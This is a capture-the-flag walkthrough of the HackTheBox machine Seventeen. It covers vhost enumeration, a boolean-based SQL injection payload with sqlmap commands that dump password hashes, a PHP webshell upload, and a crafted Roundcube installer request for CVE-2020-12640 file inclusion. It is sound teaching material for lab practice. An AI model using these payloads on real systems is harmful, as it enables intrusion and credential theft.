---
title: HTB: Seventeen
url: https://0xdf.gitlab.io/2022/09/24/htb-seventeen.html
date: 2022-09-24T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, htb-seventeen, hackthebox, nmap, feroxbuster, wfuzz, vhosts, exam-management-system, searchsploit, sqli, boolean-based-sqli, sqlmap, crackstation, roundcube, cve-2020-12640, upload, burp, burp-proxy, docker, credentials, password-reuse, javascript, nodejs, npm, verdaccio, home-env, malicious-node-module, htb-blunder, oscp-like-v2
---

![Seventeen](https://0xdfimages.gitlab.io/img/seventeen-cover.png)

Seventeen presented a bunch of virtual hosts, each of which added some piece to eventually land execution. The exam site has a boolean-based SQL injection, which provides access to the database, which leaks another virtual host and it’s DB. The oldmanagement system provides file upload, and leaks the hostname of a Roundcube webmail instance. I’ll upload a webshell and exploit CVE-2020-12640 in Roundcube to include it and get execution. There’s two pivots of password reuse, before getting root by installing a malicious Node module from a rogue NPM server. In Beyond Root, I’ll look at why root uses the .npmrc file from kavi’s home directory and unintended bypassing the htaccess file for webshell execution.

## Box Info

| Name | [Seventeen](https://hackthebox.com/machines/seventeen)  [Seventeen](https://hackthebox.com/machines/seventeen) [Play on HackTheBox](https://hackthebox.com/machines/seventeen) |
| --- | --- |
| Release Date | [28 May 2022](https://twitter.com/hackthebox_eu/status/1572646864348147713) |
| Retire Date | 24 Sep 2022 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Seventeen |
| Radar Graph | Radar chart for Seventeen |
| First Blood User | 01:33:41[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 02:02:05[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [kavigihan kavigihan](https://app.hackthebox.com/users/389926) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22) and HTTP (80, 8000):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.165
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-21 20:39 UTC
Nmap scan report for seventeen.htb (10.10.11.165)
Host is up (0.088s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 7.39 seconds
oxdf@hacky$ nmap -p 22,80,8000 -sCV 10.10.11.165
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-21 20:39 UTC
Nmap scan report for seventeen.htb (10.10.11.165)
Host is up (0.086s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:b2:6e:bb:92:7d:5e:6b:36:93:17:1a:82:09:e4:64 (RSA)
|   256 1f:57:c6:53:fc:2d:8b:51:7d:30:42:02:a4:d6:5f:44 (ECDSA)
|_  256 d5:a5:36:38:19:fe:0d:67:79:16:e6:da:17:91:eb:ad (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Let's begin your education with us! 
8000/tcp open  http    Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 403 Forbidden
Service Info: Host: 172.17.0.3; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 18.04 bionic.

### Website - TCP 80

#### Site

The site is for an education support company:

[![image-20220503164410659](https://0xdfimages.gitlab.io/img/image-20220503164410659.png)](https://0xdfimages.gitlab.io/img/image-20220503164410659.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220503164410659.png)

At the top left corner it says `seventeen.htb`. I’ll add that to my `/etc/hosts` file, but the site seems the same visited by IP or domain name.

#### Tech Stack

The root page loads as `index.html`, so no hint there as to the technologies behind the site.

The HTTP response headers don’t show much either:

```

HTTP/1.1 200 OK
Date: Wed, 21 Sep 2022 20:42:54 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Sun, 10 Apr 2022 05:31:57 GMT
ETag: "50d1-5dc46256b75a0-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 20689
Connection: close
Content-Type: text/html

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site, but it doesn’t find anything interesting:

```

oxdf@hacky$ feroxbuster -u http://seventeen.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://seventeen.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      315c http://seventeen.htb/images => http://seventeen.htb/images/
301      GET        9l       28w      311c http://seventeen.htb/js => http://seventeen.htb/js/
301      GET        9l       28w      312c http://seventeen.htb/css => http://seventeen.htb/css/
200      GET      532l     1547w    20689c http://seventeen.htb/
301      GET        9l       28w      314c http://seventeen.htb/fonts => http://seventeen.htb/fonts/
403      GET        9l       28w      278c http://seventeen.htb/server-status
[####################] - 1m    180000/180000  0s      found:6       errors:4      
[####################] - 59s    30000/30000   502/s   http://seventeen.htb 
[####################] - 0s     30000/30000   0/s     http://seventeen.htb/images => Directory listing (add -e to scan)
[####################] - 0s     30000/30000   0/s     http://seventeen.htb/js => Directory listing (add -e to scan)
[####################] - 0s     30000/30000   0/s     http://seventeen.htb/css => Directory listing (add -e to scan)
[####################] - 59s    30000/30000   502/s   http://seventeen.htb/ 
[####################] - 0s     30000/30000   0/s     http://seventeen.htb/fonts => Directory listing (add -e to scan)

```

### Website - TCP 8000

#### Site

The site on 8000 returns 403 Forbidden:

![image-20220510191703913](https://0xdfimages.gitlab.io/img/image-20220510191703913.png)

It responds the same way by IP as well.

#### Directory Brute Force

Directory brute force doesn’t find anything here except for the Apache server status page (which is 403, can’t access):

```

oxdf@hacky$ feroxbuster -u http://seventeen.htb:8000 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://seventeen.htb:8000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c http://seventeen.htb:8000/
403      GET        9l       28w      280c http://seventeen.htb:8000/server-status
[####################] - 1m     60000/60000   0s      found:2       errors:0      
[####################] - 59s    30000/30000   501/s   http://seventeen.htb:8000 
[####################] - 55s    30000/30000   543/s   http://seventeen.htb:8000/ 

```

### VHost Fuzz

Given the use of domain names, I’ll use `wfuzz` to look for any virtual host routing:

```

oxdf@hacky$ wfuzz -u http://seventeen.htb -H "Host: FUZZ.seventeen.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 20689
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://seventeen.htb/
Total requests: 19966

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000689:   400        10 L     35 W     301 Ch      "gc._msdcs"
000001013:   200        347 L    991 W    17375 Ch    "exam"
000009532:   400        10 L     35 W     301 Ch      "#www"
000010581:   400        10 L     35 W     301 Ch      "#mail"
000019834:   400        10 L     35 W     301 Ch      "_domainkey"

Total time: 219.1718
Processed Requests: 19966
Filtered Requests: 19961
Requests/sec.: 91.09748

```

The 400 errors on subdomains with special characters are not interesting, but `exam` is interesting.

### exam.seventeen.htb

#### Site

This site hosts the Exam Management System:

![image-20220503170416911](https://0xdfimages.gitlab.io/img/image-20220503170416911.png)

Clicking the “admin” link goes to `/admin/login.php`, which just pops a message box:

![image-20220503170458860](https://0xdfimages.gitlab.io/img/image-20220503170458860.png)

The response is literally just that:

```

HTTP/1.1 200 OK
Date: Tue, 03 May 2022 21:04:32 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
Content-Length: 48
Content-Type: text/html; charset=UTF-8
Connection: close

<script>alert("Admin login disabled!");</script>

```

The “Exams” link leads to `/?p=exams`, a common PHP URL format where this includes the page `exams.php`. It has a search bar, but I can’t get it to submit anything:

![image-20220503170711054](https://0xdfimages.gitlab.io/img/image-20220503170711054.png)

“About Us” (`/?p=about`) has some basic text, but nothing interesting.

#### Tech Stack

`index.php` does load the main page here, so the site is PHP. It’s in the `X-Powered-By` header as well:

```

HTTP/1.1 200 OK
Date: Tue, 03 May 2022 21:17:16 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 17418
Content-Type: text/html; charset=UTF-8
Connection: close

```

#### Directory Brute Force

The directory brute force on this page finds a bunch of stuff, but nothing too unexpected or anything I can do anything with now:

```

oxdf@hacky$ feroxbuster -u http://exam.seventeen.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://exam.seventeen.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      311c http://exam.seventeen.htb/inc => http://exam.seventeen.htb/inc/
301      GET        9l       28w      313c http://exam.seventeen.htb/admin => http://exam.seventeen.htb/admin/
301      GET        9l       28w      315c http://exam.seventeen.htb/uploads => http://exam.seventeen.htb/uploads/
301      GET        9l       28w      317c http://exam.seventeen.htb/admin/inc => http://exam.seventeen.htb/admin/inc/
301      GET        9l       28w      314c http://exam.seventeen.htb/assets => http://exam.seventeen.htb/assets/
301      GET        9l       28w      317c http://exam.seventeen.htb/assets/js => http://exam.seventeen.htb/assets/js/
301      GET        9l       28w      318c http://exam.seventeen.htb/assets/css => http://exam.seventeen.htb/assets/css/
200      GET      348l      991w        0c http://exam.seventeen.htb/
301      GET        9l       28w      316c http://exam.seventeen.htb/database => http://exam.seventeen.htb/database/
301      GET        9l       28w      315c http://exam.seventeen.htb/plugins => http://exam.seventeen.htb/plugins/
301      GET        9l       28w      315c http://exam.seventeen.htb/classes => http://exam.seventeen.htb/classes/
301      GET        9l       28w      312c http://exam.seventeen.htb/libs => http://exam.seventeen.htb/libs/
301      GET        9l       28w      321c http://exam.seventeen.htb/admin/plugins => http://exam.seventeen.htb/admin/plugins/
301      GET        9l       28w      318c http://exam.seventeen.htb/admin/user => http://exam.seventeen.htb/admin/user/
301      GET        9l       28w      313c http://exam.seventeen.htb/build => http://exam.seventeen.htb/build/
301      GET        9l       28w      312c http://exam.seventeen.htb/dist => http://exam.seventeen.htb/dist/
301      GET        9l       28w      324c http://exam.seventeen.htb/admin/categories => http://exam.seventeen.htb/admin/categories/
301      GET        9l       28w      322c http://exam.seventeen.htb/plugins/jquery => http://exam.seventeen.htb/plugins/jquery/
301      GET        9l       28w      328c http://exam.seventeen.htb/admin/plugins/jquery => http://exam.seventeen.htb/admin/plugins/jquery/
301      GET        9l       28w      318c http://exam.seventeen.htb/admin/dist => http://exam.seventeen.htb/admin/dist/
301      GET        9l       28w      321c http://exam.seventeen.htb/admin/dist/js => http://exam.seventeen.htb/admin/dist/js/
301      GET        9l       28w      322c http://exam.seventeen.htb/admin/dist/css => http://exam.seventeen.htb/admin/dist/css/
301      GET        9l       28w      322c http://exam.seventeen.htb/admin/dist/img => http://exam.seventeen.htb/admin/dist/img/
301      GET        9l       28w      320c http://exam.seventeen.htb/build/config => http://exam.seventeen.htb/build/config/
301      GET        9l       28w      327c http://exam.seventeen.htb/admin/dist/js/pages => http://exam.seventeen.htb/admin/dist/js/pages/
301      GET        9l       28w      322c http://exam.seventeen.htb/plugins/popper => http://exam.seventeen.htb/plugins/popper/
...[snip]...

```

## Shell as www-data [docker]

### SQL Injection

#### Identify Vulnerability

`searchsploit` shows four vulnerabilities across two software that might fit this application:

```

oxdf@hacky$ searchsploit exam management system
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
Exam Hall Management System 1.0 - Unrestricted F | php/webapps/50103.php
Exam Hall Management System 1.0 - Unrestricted F | php/webapps/50111.py
Exam Reviewer Management System 1.0 - Remote Cod | php/webapps/50726.txt
Exam Reviewer Management System 1.0 - ‘id’ S | php/webapps/50725.txt
------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

When looking at these to see if either matches Seventeen, I’ll compare the URL structure to the URLs from `feroxbuster` above. The first two point to `/pages/save_user.php`. I couldn’t find any page like that on the server. The second two target `/erms/classes/Users.php` and `/erms/?p=take_exam&id=1`. Those look like URLs I’ve already seen (without the `/erms`).

50726 is a authenticated RCE. As I don’t have creds, I’ll forucs on the next one.

50725 is a boolean-based blind SQL injection.

#### SQL Injection

The POC is:

```

p=take_exam&id=1' AND 4755=4755 AND 'VHNu'='VHNu

```

Visiting the URL returns a page:

![image-20220503173823111](https://0xdfimages.gitlab.io/img/image-20220503173823111.png)

If I replace `4755=4755` with `4755=4756`:

![image-20220511100624195](https://0xdfimages.gitlab.io/img/image-20220511100624195.png)

This page actually has the following tacked on at the end of the HTML:

```

<script> alert("Unkown Exam ID"); location.replace("./");</script>

```

Given the different behaviors based on if the condition in the middle is equal or not, this is a boolean-based SQL injection.

#### sqlmap

I’ll give `sqlmap` the URL, as well as `--technique B` (for boolean-based) and `-p id` to tell it which parameter to work on.

```

oxdf@hacky$ sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch
...[snip]...
[14:05:35] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=844b4ad6133...45b2d7d69c'). Do you want to use those [Y/n] Y
[14:05:35] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:05:36] [INFO] testing if the target URL content is stable
[14:05:36] [INFO] target URL content is stable
[14:05:36] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[14:05:36] [INFO] testing for SQL injection on GET parameter 'id'
[14:05:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:05:38] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="This")
[14:05:40] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[14:05:40] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 39 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=take_exam&id=1' AND 5630=5630 AND 'cpfT'='cpfT
---
[14:05:41] [INFO] testing MySQL
[14:05:41] [INFO] confirming MySQL
[14:05:41] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
...[snip]...

```

It found the injection and I can now ask it questions.

### Access SFMS

#### DB Enumeration

I’ll list the DBs with `--dbs` (I’ll also add `--batch` to choose default answers to any prompts, and threads are safe because it’s boolean, not time-based):

```

oxdf@hacky$ sqlmap --dbs -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch --threads 10
...[snip]...
available databases [4]:
[*] db_sfms
[*] erms_db
[*] information_schema
[*] roundcubedb
...[snip]...

```

`information_schema` is the internal MySQL stuff. `roundcube` is a webmail service (which I haven’t seen yet). `erms_db` is likely the DB for Exam Management. I have no idea what `db_sfms` is.

#### erms\_db

I’ll start with `erms_db`. It has six tables:

```

oxdf@hacky$ sqlmap -D erms_db --tables -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch --threads 10
...[snip]...
Database: erms_db
[6 tables]
+---------------+
| category_list |
| exam_list     |
| option_list   |
| question_list |
| system_info   |
| users         |
+---------------+
...[snip]...

```

I’ll dump the `users` table:

```

oxdf@hacky$ sqlmap -D erms_db -T users --dump -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch --threads 10
...[snip]...
Database: erms_db
Table: users
[3 entries]
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
| id | type | avatar                            | lastname | password                         | username         | firstname    | date_added          | last_login | date_updated        |
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
| 1  | 1    | ../oldmanagement/files/avatar.png | Admin    | fc8ec7b43523e186a27f46957818391c | admin            | Adminstrator | 2021-01-20 14:02:37 | NULL       | 2022-02-24 22:00:15 |
| 6  | 2    | ../oldmanagement/files/avatar.png | Anthony  | 48bb86d036bb993dfdcf7fefdc60cc06 | UndetectableMark | Mark         | 2021-09-30 16:34:02 | NULL       | 2022-05-10 08:21:39 |
| 7  | 2    | ../oldmanagement/files/avatar.png | Smith    | 184fe92824bea12486ae9a56050228ee | Stev1992         | Steven       | 2022-02-22 21:05:07 | NULL       | 2022-02-24 22:00:24 |
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
...[snip]...

```

There’s three users, each with what look like MD5 hashes for the password. [CrackStation](https://crackstation.net/) doesn’t crack any of them.

There’s also paths to the users’ avatars. They each start with `../oldmanagement/files/`.

#### New VHost

There’s a couple databases that I can’t associate with an application at this point. Thinking about how web servers are typically setup, various hosts each have a folder in `/var/www/`. So if ERMS is running out of something like `/var/www/emrs`, then the avatars are linked back to `/var/www/oldmanagement`, which suggests that might be a different virtual host. It’s worth a try - adding `oldmanagement.seventeen.htb` to `/etc/hosts` and visiting in Firefox loads a new login form:

![image-20220503205802532](https://0xdfimages.gitlab.io/img/image-20220503205802532.png)

Surprisingly, there are no exploits in `searchsploit` for this.

Interestingly, the request does redirect to `http://oldmanagement.seventeen.htb:8000/oldmanagement/`. So this app is actually hosted on port 8000.

#### db\_sfms

I couldn’t find a way to past that Login form, but I do have access to the `db_sfms` via the SQL injection, which turns out to be related to this page:

```

oxdf@hacky$ sqlmap -D db_sfms --tables -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch --threads 10
...[snip]...        
Database: db_sfms
[3 tables]
+---------+
| storage |
| user    |
| student |
+---------+
...[snip]...

```

I’ll dump the tables. `user` is interesting since I’m trying to log in:

```

oxdf@hacky$ sqlmap -D db_sfms -T user --dump -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch --threads 10
...[snip]...
Database: db_sfms
Table: user
[3 entries]
+---------+---------------+---------------+------------------+---------------+----------------------------------+
| user_id | status        | lastname      | username         | firstname     | password                         |
+---------+---------------+---------------+------------------+---------------+----------------------------------+
| 1       | administrator | Administrator | admin            | Administrator | fc8ec7b43523e186a27f46957818391c |
| 2       | Regular       | Anthony       | UndetectableMark | Mark          | b35e311c80075c4916935cbbbd770cef |
| 4       | Regular       | Smith         | Stev1992         | Steven        | 112dd9d08abf9dcceec8bc6d3e26b138 |
+---------+---------------+---------------+------------------+---------------+----------------------------------+
...[snip]...

```

Each user has an MD5 hash as their password. Admin and Mark share their passwords from ERMS. Still, to log in, I need a student number and a password, which isn’t what’s in this table.

The `student` table has what I’m looking for:

```

oxdf@hacky$ sqlmap -D db_sfms -T student --dump -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B --batch --threads 10
...[snip]...
Database: db_sfms
Table: student
[4 entries]
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
| stud_id | yr | gender | stud_no | lastname | password                                           | firstname |
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
| 1       | 1A | Male   | 12345   | Smith    | 1a40620f9a4ed6cb8d81a1d365559233                   | John      |
| 2       | 2B | Male   | 23347   | Mille    | abb635c915b0cc296e071e8d76e9060c                   | James     |
| 3       | 2C | Female | 31234   | Shane    | a2afa567b1efdb42d8966353337d9024 (autodestruction) | Kelly     |
| 4       | 3C | Female | 43347   | Hales    | a1428092eb55781de5eb4fd5e2ceb835                   | Jamie     |
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
...[snip]...

```

Kelly Shane’s password breaks in [CrackStation](https://crackstation.net/):

![image-20220503210845030](https://0xdfimages.gitlab.io/img/image-20220503210845030.png)

At the School File Management System, logging in with 31234 and “autodestruction” works.

### RCE

#### School File Management System

Logged in as Kelly, the application looks like a single page app, an instance of [School File Management System](https://www.sourcecodester.com/php/14155/school-file-management-system.html):

![image-20220504133157138](https://0xdfimages.gitlab.io/img/image-20220504133157138.png)

On the left is a list of files associated with Kelly’s account. On the right is the ability to upload more. I uploaded a PHP webshell, and it allowed it:

![image-20220504133433297](https://0xdfimages.gitlab.io/img/image-20220504133433297.png)

But there’s no way to interact with it, at least not at the moment. “Download” will save a copy to my system. I’ll show an unintended way to get a shell abusing this upload in [Beyond Root](#unintended-webshell-execution). I’ll note the upload ability, and come back to this later.

I’ll download the one document that was there. It’s a grade sheet or report card:

![image-20220504133557482](https://0xdfimages.gitlab.io/img/image-20220504133557482.png)

On the second page, there’s text:

> Dear Kelly,
> Hello! Congratulations on the good grades. Your hard work has paid off!
> But I do want to point out that you are lacking marks in Science. All the
> other subjects are perfectly fine and acceptable. But you do have to work
> on your knowledge in Science related areas.
> Mr. Sam, your science teacher has mentioned to me that you are lacking
> in the Physics section specifically. So we thought maybe we could work on
> those skills by organizing some extra classes. Some other colleagues of
> yours have already agreed to this and are willing to attend the study sessions
> at night.
> Please let Mr. Sam know the exact time when you can participate in the sessions.
> And he wanted you to know that he won’t be active thorough the socials
> these days. You can use our new webmail service instead.
> (https://mastermailer.seventeen.htb/) Original resource by Seventeen TLC
>
> Thanks,
> Mr.StevenBanks
> TIC
> Also, your request to add the past papers to the file management application
> was acknowledged by the server management staff.
> They informed that those were stored and will be available for you to download
> shortly.

I’ll add the new “webmail service” vhost to my `/etc/hosts` file.

#### Roundcube

The new domain is an instance of Roundcube:

![image-20220504133944563](https://0xdfimages.gitlab.io/img/image-20220504133944563.png)

If I hadn’t of recognized the logo, it’s in the HTML source:

![image-20220504134029858](https://0xdfimages.gitlab.io/img/image-20220504134029858.png)

There are a couple method to get there Roundcuber version. `/CHANGELOG` loads the Change Log, which shows the release at the top:

![image-20220511102431636](https://0xdfimages.gitlab.io/img/image-20220511102431636.png)

The note also says it was “recently installed” and the note was uploaded in January 2020:

![image-20220504134750697](https://0xdfimages.gitlab.io/img/image-20220504134750697.png)

Looking a the Roundcube GitHub releases page, the release of [1.4.2](https://github.com/roundcube/roundcubemail/releases?page=3) was on 1 January 2020:

![image-20220504134938300](https://0xdfimages.gitlab.io/img/image-20220504134938300.png)

I’ll also note that the GET to `mastermailer.seventeen.htb` actually redirects to `mastermailer.seventeen.htb:8000/mastermailer`. Just like SFMS, it seems this is running on the port 8000 service.

#### Identify Exploits

`searchsploit` doesn’t show any vulnerabilities in this version or anything after it. Some Googling shows there are several CVEs from 2020. Most are XSS (which likely involves sending email to users, which I can’t do at the moment).

CVE-2020-12641 is RCE, abusing the Roundcube installer. But [this page](https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2020-12641-Command%20Injection-Roundcube) show I still need to be able to send an email to a user.

CVE-2020-12640 is very similar, using a local file include (LFI) to include a webshell. [This page](https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2020-12640-PHP%20Local%20File%20Inclusion-Roundcube) (from the same author as the previous) gives good detail, although from a different perspective. It says:

> In this case, in order to simplify the PoC, we consider the attacker to have SSH access as a low privileged user and write the files to “/dev/shm”.

Then it uses this bug to include a webshell it writes in `/dev/shm`. I don’t have access to write a file via a shell, but I can write files with the School File Management System.

#### CVE-2020-12640

I’ll start by loading the installer on Roundcube at `http://mastermailer.seventeen.htb:8000/mastermailer/installer`:

[![image-20220504151201159](https://0xdfimages.gitlab.io/img/image-20220504151201159.png)](https://0xdfimages.gitlab.io/img/image-20220504151201159.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220504151201159.png)

I’ll click on the link to “Create config”:

[![image-20220504152517667](https://0xdfimages.gitlab.io/img/image-20220504152517667.png)](https://0xdfimages.gitlab.io/img/image-20220504152517667.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220504152517667.png)

This form has a ton of fields. I’ll submit this through Burp and intercept the request. The POST request matches the POC. I’ll modify the request to look like the POC. I can hack out a bunch of the stuff that I’m not trying to change, and it’ll look like this:

```

POST /mastermailer/installer/index.php HTTP/1.1
Host: mastermailer.seventeen.htb:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 798
Origin: http://mastermailer.seventeen.htb:8000
Connection: close
Referer: http://mastermailer.seventeen.htb:8000/mastermailer/installer/index.php?_step=2
Cookie: PHPSESSID=2f367f87a86cd958ab11dcad63499bf2
Upgrade-Insecure-Requests: 1

_step=2&_product_name=Seventeen+Webmail&submit=UPDATE+CONFIG&_plugins_qwerty=[path here]

```

Unfortunately, finding a reasonable path is difficult. Looking at the POC, it creates a `/dev/shm/zipdownload` and a file `/dev/shm/zipdownload.php`. The page then tries to load `"/var/www/html/roundcube/plugins/../../../../../../dev/shm/zipdownload/../../../../../../dev/shm/zipdownload.php`. That only works because both the folder `zipdownload` and the file `zipdownload.php` exist. I need a place on Seventeen that allows me to match that structure.

#### Find Upload Path

I’ve already been working on the theory that the SFMS is hosted out of `/var/www/oldmanagement`. Hovering over the download link for the file I uploaded earlier, it points to `download.php?store_id=35`.

![](https://0xdfimages.gitlab.io/img/image-20220504145729.png)

I’ll download the [SFMS source](https://www.sourcecodester.com/sites/default/files/download/razormist/school-file-management-system.zip) and take a look at how it saves and downloads files. After unzipping the download, the base files are:

```

oxdf@hacky$ ls
admin  download.php  index.php  login_query.php  remove_file.php  script.php           student_update.php  validator.php
db     files         login.php  logout.php       save_file.php    student_profile.php  update_query.php

```

`download.php` is very simple:

```

<?php
    require_once 'admin/conn.php';
    if(ISSET($_REQUEST['store_id'])){
        $store_id = $_REQUEST['store_id'];

        $query = mysqli_query($conn, "SELECT * FROM `storage` WHERE `store_id` = '$store_id'") or die(mysqli_error());
        $fetch  = mysqli_fetch_array($query);
        $filename = $fetch['filename'];
        $stud_no = $fetch['stud_no'];
        header("Content-Disposition: attachment; filename=".$filename);
        header("Content-Type: application/octet-stream;");
        readfile("files/".$stud_no."/".$filename);
    }
?>

```

It fetches a row from the `storage` table of the database, and gets the filename from the result. It returns `readfile(files/[stud_no]/[filename])`.

So it should be at `/var/www/oldmanagement/files/31234/0xdf.php`.

I still need a directory to sit next to my upload. `download.php` uses the `store_id` to get the path, but perhaps I can access `/files/31234` directly:

```

oxdf@hacky$ curl http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at oldmanagement.seventeen.htb Port 8000</address>
</body></html>
oxdf@hacky$ curl http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31235/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at oldmanagement.seventeen.htb Port 8000</address>
</body></html>

```

It returns a 403 Forbidden on the folder I know exists ( `/31234`) and a 404 Not Found on the one I don’t think exists (`/31235`). That’s a good sign that’s the right path, even if I can’t access it directly.

Running `feroxbuster` in this folder finds a `papers` directory!

```

oxdf@hacky$ feroxbuster -u http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/

